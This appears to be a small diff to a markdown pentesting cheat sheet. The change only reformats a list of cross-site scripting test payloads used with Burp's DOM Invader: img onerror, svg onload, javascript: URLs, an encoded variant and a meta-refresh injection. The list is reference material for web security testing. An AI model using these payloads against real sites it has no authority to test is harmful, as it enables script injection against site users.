@@ -25,10 +25,10 @@ DOM Invader --> Burp's built-in browser
 `<img src=x onerror=prompt(1)>`  
 `;</script><svg onload=alert("message")>`  
 `?q=javascript:alert(1)`  
-`?q=j%61vascript:alert(1)`
-`<img src="javascript:alert(1)"`
-`<body oninput=javascript:alert(1)><input autofocus>`
-`"><meta http-equiv="refresh" content="0;url=41361"`
+`?q=j%61vascript:alert(1)`  
+`<img src="javascript:alert(1)"`  
+`<body oninput=javascript:alert(1)><input autofocus>`  
+`"><meta http-equiv="refresh" content="0;url=41361"`  
 
 ```
 "</script><script>
